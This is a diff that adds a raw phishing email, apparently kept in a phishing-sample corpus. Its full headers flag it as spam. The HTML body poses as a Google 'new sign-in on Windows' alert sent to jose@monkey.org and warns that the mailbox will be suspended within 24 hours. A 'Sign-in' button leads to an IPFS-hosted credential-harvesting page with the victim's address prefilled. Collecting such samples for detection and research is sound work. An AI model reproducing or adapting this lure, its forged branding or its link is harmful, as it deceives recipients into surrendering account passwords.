@@ -1,0 +1,165 @@
+Return-Path: info@ytomtravel.com
+Delivered-To: jose@monkey.org
+X-FDA: 82301931054.18.5695A5F
+Received: from 6049955.shadows-group.com (6049955.shadows-group.com
+ [162.240.221.2])	by imf24.b.hostedemail.com (Postfix) with ESMTP id
+ 92CA580016	for <jose@monkey.org>; Thu,  4 Jul 2024 12:01:45 +0000 (UTC)
+Authentication-Results: imf24.b.hostedemail.com;	dkim=pass
+ header.d=pausa-sa.com header.s=default header.b=tcOp+SCG;	spf=softfail
+ (imf24.b.hostedemail.com: 162.240.221.2 is neither permitted nor denied by
+ domain of info@ytomtravel.com) smtp.mailfrom=info@ytomtravel.com;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1720094489;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=41g7KAnwZO5Q0ZYrAf/KJoPgkYrA6TEVoZhZ8T1YJyU=;
+	b=Ow/wlege5NUjzFrrUP3Hz3dcipBkFMRteK4jnEDVx3GsK2YWKcmNxxlsPzezc5ifKY9pGc
+	4X8Wdv7DTMMKL3ZI1MnPOhN+cjHfsxe2xnjpA1ROQi45hKZxvijV5gjAc1r1PBMykbjQVJ
+	bSMbDKyaIWt0jgNA7Uxz0blMPBbxu0M=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1720094489; a=rsa-sha256;
+	cv=none;
+	b=z9DVAeuiXbFbaK61lD3gu6TLluYE5qjJEoQF8hEe3nOqvOybdtXDpyuoFy59xaA0rPYMqf
+	MMl9jXXJJldGaJ35A3rm3+noJN40a2tW/16hJz0slBMaoPeB2DJEEjYq4OaiX4RrlpJc8+
+	G4xdyoqvE/xSA4mjP2/15gcw4h2Kd14=
+ARC-Authentication-Results: i=1;	imf24.b.hostedemail.com;	dkim=pass
+ header.d=pausa-sa.com header.s=default header.b=tcOp+SCG;	spf=softfail
+ (imf24.b.hostedemail.com: 162.240.221.2 is neither permitted nor denied by
+ domain of info@ytomtravel.com) smtp.mailfrom=info@ytomtravel.com;	dmarc=none
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=pausa-sa.com; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=41g7KAnwZO5Q0ZYrAf/KJoPgkYrA6TEVoZhZ8T1YJyU=; b=tcOp+SCGeyNxHs9+RtxX9nYEF3
+	ed+jPD5RlDRZr9b7m1bOr4xf1LhdGJRT5GnyzJnney/rPlRnujCAm8t4RC0vNwEii76RNlv5IrCtx
+	l9RxZd8bmrd4ibTQYULjUj5BiSRShsfb+37BDJZqIO9mX78QcibAUXCuIZTN938SF4xYaYeQu8SXG
+	uQ2O4ehqhlXOLB1ZQU8TI/ScRhgGAr5qEcFdOfJ6n7TXY9lJyD1V4YYfV1VxZza8TPf75BinDPLg+
+	QevKAbc4JkZvO21wots2mzMvulY4xreC54UH44PggnUNBbTK4xYFQkGJ3eSLThfLz2GjG1fEU5Y6y
+	jwM9RkrQ==;
+Received: from ec2-3-133-89-138.us-east-2.compute.amazonaws.com
+ ([3.133.89.138]:49940)	by 6049955.shadows-group.com with esmtpsa  (TLS1.3)
+ tls TLS_AES_256_GCM_SHA384	(Exim 4.97.1)	(envelope-from
+ <info@ytomtravel.com>)	id 1sPLA1-00000009SYa-1W7i	for jose@monkey.org;	Thu,
+ 04 Jul 2024 20:01:49 +0800
+From: Support-monkey.org<info@ytomtravel.com>
+To: jose@monkey.org
+Subject: Warning Update Your Email
+Date: 4 Jul 2024 12:01:44 +0000
+Message-ID: <20240704120143.B805C8AC4F0B3039@ytomtravel.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - 6049955.shadows-group.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - ytomtravel.com
+X-Get-Message-Sender-Via:
+ 6049955.shadows-group.com: authenticated_id: amr@pausa-sa.com
+X-Authenticated-Sender: 6049955.shadows-group.com: amr@pausa-sa.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam04
+X-Rspam-User: 
+X-Stat-Signature: 643g3o18nrf43y9g9ofx6hjfe3e414ok
+X-Rspamd-Queue-Id: 92CA580016
+X-Spam-Status: Yes, score=20.40
+X-HE-Tag: 1720094505-132093
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+JwLQqSKI9mM2fW9K/C3HCDubdJdrC0MTO103c65jcQAz?=
+ =?utf-8?q?R2F7/iR0OPfJkW8xWYv1cG4wNhqQCD3feXpNG7ToFvZxrAW61KJ3PVvmbbaQW0fcZ?=
+ =?utf-8?q?lMNgkZTqFGg5i/xfYqcytK+ThyAUUWxP+qYDFJdrNzyLIfYfxgdQqrVTZB5OFTf0y?=
+ =?utf-8?q?kKOLb9v0fIgiJExChKthiLSE8D8v7OOjXren11wOESLugz/zTOCLAtp9/DfmqwoPG?=
+ =?utf-8?q?ctoRbkwefaZFjk8sCWnJ/gi5QTEHNolrDjaPyKK37+CDtqTQEi3hbhxaCj9HpaqjP?=
+ =?utf-8?q?wfSXrjbksMIwq2NBIA66kYAl8jAT8wJ23o+c/NsMSj3x4bRrOJJQ+yXJ4hpZqvKx3?=
+ =?utf-8?q?wxHmeJrfKwXIlT1xcmg4EJjFtJgrKn+1YNeqNfSWxTronoFH9YPFu3qCm1K+lUikP?=
+ =?utf-8?q?CEt6O/obtdh2UiSswskdZhWb0hv3dlxA3CjJR4PA1DOtflbA8Nw32TEPR46PllDti?=
+ =?utf-8?q?XuloAlOXny9sbLRqNM9MBL9CrIw8zR3rbJN1ig4Bb+SHgLWPvGb0DSVbj/wV1p1rG?=
+ =?utf-8?q?/4B1ohhV1v/7jfk2xK1iA1fz74xOUQ0HGKExgUgd2lVK8IDPSfT56F2ZafPJO10PD?=
+ =?utf-8?q?KaLT+hWjpE4Xv9wF+97p5LWymNxe+zIAjgQXDn1aUSgeEjKcD/eVDCWbW/VfPnu4M?=
+ =?utf-8?q?OGyDLNFKQeHm/14RextmOHmjoN3XSluToos+bgtcLrfMLLA8ASI88BCknWnfF4DtW?=
+ =?utf-8?q?V2G4ylByoon6nr1bWDzHoud/StLyGfDaz5ioy2Z6+tD/n9iDuuNQknMLcHX1+iBye?=
+ =?utf-8?q?asvSVl5RWgnKsvVkiEs82wij2KVO6UtgSOUlebTZDQ0ashjJzp+wz/FYpXA0LfcZz?=
+ =?utf-8?q?wCWqZerishEnyzJJ+a9Q+iqqiUKWkiU8kOuIVPtWu+rf1kS9oRjonno5FwUBKirxE?=
+ =?utf-8?q?ZVGeRz9DliMnFgTVy8CmSG_be3KO+ahD2rey00rCfPSwFpfliU6FmvSn0rl57UKyP?=
+ =?utf-8?q?1Gln18NSRA/YKBefGBQ1eypQsUJEfqpk/QfkOFgqo70HXfQQm/k7gNGBX1GdGI0u3?=
+ =?utf-8?q?9wRk/LwtAyJ4sDrz/vclYsHr2HmNle8OO5EyC36XivBAuthJF3fZpuAbqqMNI9CB+?=
+ =?utf-8?q?LicqfISnYE+lc7+zZyReEko0QBG1XQwmtZTiSADYQyn/hNpbErZkFKLDxMzoFFX1+?=
+ =?utf-8?q?OYV+9gWVDa0u3VxfGna0h4U140qMx5/afV6BCHnVjKxRQdOs6Ezm5u1iNJj6aE86x?=
+ =?utf-8?q?9pOhU3VLbdlzkE6Pnn4bu/Q3VlvcbUC2tAccctlyBslYLSJlCvSNhSeBJp2ckaX0L?=
+ =?utf-8?q?f1/wH0RPIUUprhW97pX9Jr0J4zDGrJSB9NSjAp6Ol79OFgaG+kBJvlf0dRfkLm4bY?=
+ =?utf-8?q?8emdyzQu4C3H1lTQ8OX0CytQirF2lQmkCGA3YoFY9lLaR5NFCjXYWY49Tflts71mU?=
+ =?utf-8?q?DOIrxzQucSM2y1EIEfg8mW3Mf+IfQuveAeoklrHWX25ZFhKuM+oZ+yr1rQgX2qrLd?=
+ =?utf-8?q?71ojC/eObMuQqXO9yNxnW6mdYWLM6wcBS2db7nWqBYwJ7/CjPi6KV1fl03JVPM=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 196
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"100%" height=3D"100%" lang=3D"en" style=3D"color: rgb(34, 3=
+4, 34); text-transform: none; letter-spacing: normal; font-family: Arial, H=
+elvetica, sans-serif; font-size: small; font-style: normal; font-weight: 40=
+0; word-spacing: 0px; white-space: normal; min-width: 348px; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0"><tbody><tr align=3D"center"><td style=3D"margin: 0px;"><br class=3D"=
+Apple-interchange-newline"><table style=3D"padding-bottom: 20px; min-width:=
+ 220px; max-width: 516px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"=
+><tbody><tr></tr></tbody><table style=3D"padding-bottom: 20px; min-width: 2=
+20px; max-width: 516px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><=
+tbody><tr><td width=3D"8" style=3D"margin: 0px; width: 8px;"></td>
+<td style=3D"margin: 0px;"><div align=3D"center" class=3D"m_690674846909546=
+403mdv2rw" style=3D"padding: 40px 20px; border-radius: 8px; border: thin so=
+lid rgb(218, 220, 224);"><div style=3D'text-align: center; color: rgba(0, 0=
+, 0, 0.87); line-height: 32px; padding-bottom: 24px; font-family: "Google S=
+ans", Roboto, RobotoDraft, Helvetica, Arial, sans-serif; border-bottom-colo=
+r: rgb(218, 220, 224); border-bottom-width: thin; border-bottom-style: soli=
+d;'><div style=3D"font-size: 24px;"><font color=3D"#d66329">
+monkey.org</font><br>A new sign-in on Windows</div><table align=3D"center" =
+style=3D"margin-top: 8px;"><tbody><tr style=3D"line-height: normal;"><td al=
+ign=3D"right" style=3D"margin: 0px; padding-right: 8px;"></td><td style=3D"=
+margin: 0px;">jose@monkey.org</td></tr></tbody></table></div><div style=3D"=
+text-align: center; color: rgba(0, 0, 0, 0.87); line-height: 20px; padding-=
+top: 20px; font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-=
+size: 14px;">
+We noticed a new&nbsp;sign to your&nbsp;jose@monkey.org on a Windows device=
+=2E If this was you, sign-in to secure your account./check activity. Your e=
+mail will be suspended in 24 hours if you do not sign in to comfim login<di=
+v style=3D"text-align: center; padding-top: 32px;"><a style=3D"text-decorat=
+ion: none;" href=3D"https://bafybeiehlmp7pecna74elb72onp5lwfglnubxcfhf3encv=
+fltbakn6clae.ipfs.dweb.link/webma.html#jose@monkey.org">
+<span style=3D"background: linear-gradient(rgb(61, 95, 194) 0%, rgb(44, 68,=
+ 138) 100%); padding: 5px 10px; border-radius: 8px; border: 1px solid rgb(8=
+, 44, 64); border-image: none; text-align: center; color: rgb(255, 255, 255=
+); line-height: 2em; letter-spacing: 2px; font-size: 24px; font-variant: sm=
+all-caps; font-weight: bold; position: relative; cursor: pointer; box-shado=
+w: 1px 3px 7px 1px #5a6480; text-shadow: 1px 1px 1px rgba(5,29,41,1); -webk=
+it-touch-callout: none; -webkit-user-select: all;=20
+-khtml-user-select: all; -moz-user-select: all; user-select: all;">Sign-in<=
+/span></a></div></div><div style=3D"text-align: center; color: rgb(95, 99, =
+104); line-height: 16px; letter-spacing: 0.3px; padding-top: 20px; font-siz=
+e: 12px;">You can also see security activity at<br><a style=3D"color: rgba(=
+0, 0, 0, 0.87); text-decoration: inherit;" href=3D"https://myaccount.monkey=
+=2Eorg/notifications">https://myaccount.monkey.org/<wbr>notifications</a></=
+div></div><div style=3D"text-align: left;">
+<div style=3D"text-align: center; color: rgba(0, 0, 0, 0.54); line-height: =
+18px; padding-top: 12px; font-family: Roboto-Regular, Helvetica, Arial, san=
+s-serif; font-size: 11px;"><div>You received this email to let you know abo=
+ut important changes to your Google Account and services.</div><div style=
+=3D"direction: ltr;">&copy; 2024 Google LLC,<span>&nbsp;</span>
+<a class=3D"m_690674846909546403afal" style=3D"text-align: center; color: r=
+gba(0, 0, 0, 0.54); line-height: 18px; padding-top: 12px; font-family: Robo=
+to-Regular, Helvetica, Arial, sans-serif; font-size: 11px;">1600 Amphitheat=
+re Parkway, Mountain View, CA 94043, USA</a></div></div></div></td></tr></t=
+body></table></td></tr></tbody></table></body></html>
+
